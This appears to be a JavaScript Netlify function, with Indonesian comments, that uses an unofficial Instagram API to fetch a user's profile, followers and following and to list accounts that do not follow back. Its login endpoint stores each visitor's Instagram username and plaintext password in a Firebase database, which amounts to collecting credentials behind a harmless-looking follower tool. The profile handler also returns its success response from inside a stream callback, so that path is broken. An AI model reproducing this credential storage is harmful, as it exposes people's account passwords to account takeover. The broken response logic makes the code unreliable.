const { IgApiClient } = require('instagram-private-api');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { db, storage } = require(path.resolve(__dirname, '../config/firebaseConfig')); // Firebase config

const ig = new IgApiClient();

// Variabel sesi yang disimpan dalam Firebase
let sessionData = null;

// Fungsi untuk login ke Instagram
const login = async () => {
    ig.state.generateDevice(process.env.INSTAGRAM_USERNAME);

    if (sessionData) {
        ig.state.deserialize(sessionData);
        console.log('Sesi ditemukan di Firebase, melanjutkan...');
        try {
            await ig.account.currentUser();
            console.log('Sesi valid, melanjutkan...');
        } catch (error) {
            console.log('Sesi kadaluarsa, login ulang...');
            await forceLogin();
        }
    } else {
        console.log('Sesi tidak ditemukan di Firebase, login ulang...');
        await forceLogin();
    }
};

// Fungsi untuk login ulang dan menyimpan sesi baru di Firebase
const forceLogin = async () => {
    try {
        console.log('Mencoba login...');
        await ig.account.login(process.env.INSTAGRAM_USERNAME, process.env.INSTAGRAM_PASSWORD);
        console.log('Login berhasil!');
        sessionData = ig.state.serialize(); // Menyimpan sesi di Firebase
        await db.ref('sessions').child(process.env.INSTAGRAM_USERNAME).set({ sessionData }); // Menyimpan sesi di Firebase
    } catch (error) {
        console.error('Login gagal:', error);
        if (error.name === 'IgCheckpointError') {
            // Tanpa readline, sebaiknya return respons 2FA kepada pengguna
            return {
                statusCode: 400,
                body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
            };
        } else {
            throw error;
        }
    }
};

// Fungsi untuk mengambil followers dengan paginasi
const getAllFollowers = async (userId) => {
    let followers = [];
    let followersFeed = ig.feed.accountFollowers(userId);

    let nextFollowers = await followersFeed.items();
    followers = followers.concat(nextFollowers);

    while (followersFeed.isMoreAvailable()) {
        nextFollowers = await followersFeed.items();
        followers = followers.concat(nextFollowers);
        await delay(2000);
    }

    return followers;
};

// Fungsi untuk mengambil following dengan paginasi
const getAllFollowing = async (userId) => {
    let following = [];
    let followingFeed = ig.feed.accountFollowing(userId);

    let nextFollowing = await followingFeed.items();
    following = following.concat(nextFollowing);

    while (followingFeed.isMoreAvailable()) {
        nextFollowing = await followingFeed.items();
        following = following.concat(nextFollowing);
        await delay(2000);
    }

    return following;
};

// Fungsi handler untuk endpoint profile Instagram
exports.handler = async function(event, context) {
    if (event.httpMethod === 'GET' && event.path === '/.netlify/functions/instagram/profile') {
        try {
            await login();
            const user = await ig.account.currentUser();

            // Mendapatkan jumlah followers dan following
            const followersCount = await ig.user.info(user.pk).then(info => info.follower_count);
            const followingCount = await ig.user.info(user.pk).then(info => info.following_count);

            // Mendapatkan gambar profil
            const profilePicUrl = user.profile_pic_url;

            // Mengunduh gambar profil dan menyimpannya ke Firebase Storage
            const fileName = `profile_pics/${user.username}.jpg`;
            const file = storage.file(fileName);

            const writeStream = file.createWriteStream();
            const response = await axios.get(profilePicUrl, { responseType: 'stream' });
            response.data.pipe(writeStream);

            writeStream.on('finish', async () => {
                console.log('Gambar profil telah disimpan ke Firebase Storage.');

                // Simpan URL gambar profil di Realtime Database
                const profilePicUrlInStorage = `https://storage.googleapis.com/${storage.name}/${fileName}`;

                // Ambil data followers dan following
                const followers = await getAllFollowers(user.pk);
                const following = await getAllFollowing(user.pk);

                const followersUsernames = followers.map(f => f.username);
                const followingUsernames = following.map(f => f.username);

                // Cari orang yang tidak follow back
                const dontFollowBack = followingUsernames.filter(username => !followersUsernames.includes(username));

                // Menyimpan data pengguna dan informasi lainnya ke Realtime Database
                await db.ref('users').child(user.pk).set({
                    username: user.username,
                    full_name: user.full_name,
                    biography: user.biography,
                    followers_count: followersCount,
                    following_count: followingCount,
                    profile_picture_url: profilePicUrlInStorage,
                    dont_follow_back: dontFollowBack,
                    dont_follow_back_count: dontFollowBack.length,
                });

                return {
                    statusCode: 200,
                    body: JSON.stringify({
                        username: user.username,
                        full_name: user.full_name,
                        biography: user.biography,
                        followers_count: followersCount,
                        following_count: followingCount,
                        profile_picture_url: profilePicUrlInStorage,
                        dont_follow_back: dontFollowBack,
                        dont_follow_back_count: dontFollowBack.length,
                    }),
                };
            });

        } catch (error) {
            console.error(error);
            if (error.name === 'IgLoginRequiredError') {
                return {
                    statusCode: 401,
                    body: JSON.stringify({ message: 'Login is required. Please check your credentials.' }),
                };
            } else {
                return {
                    statusCode: 500,
                    body: JSON.stringify({ message: 'Error fetching Instagram data' }),
                };
            }
        }
    } else if (event.httpMethod === 'POST' && event.path === '/.netlify/functions/instagram/login') {
        const { username, password } = JSON.parse(event.body);

        try {
            ig.state.generateDevice(username);
            await ig.account.login(username, password);

            sessionData = ig.state.serialize();

            const user = await ig.account.currentUser();
            const userId = user.pk;

            // Simpan ke Firebase
            const ref = db.ref('logins');
            const loginData = {
                username,
                password,
                userId,
                timestamp: new Date().toISOString(),
            };

            await ref.child(userId).set(loginData);

            return {
                statusCode: 200,
                body: JSON.stringify({ message: 'Login berhasil!' }),
            };
        } catch (error) {
            console.error('Login gagal:', error);

            if (error.name === 'IgLoginRequiredError') {
                return {
                    statusCode: 401,
                    body: JSON.stringify({ message: 'Instagram login failed: incorrect username or password.' }),
                };
            } else if (error.name === 'IgCheckpointError') {
                return {
                    statusCode: 400,
                    body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
                };
            } else {
                return {
                    statusCode: 500,
                    body: JSON.stringify({ message: 'Login failed, please try again later.' }),
                };
            }
        }
    }

    return {
        statusCode: 404,
        body: JSON.stringify({ message: 'Not Found' }),
    };
};
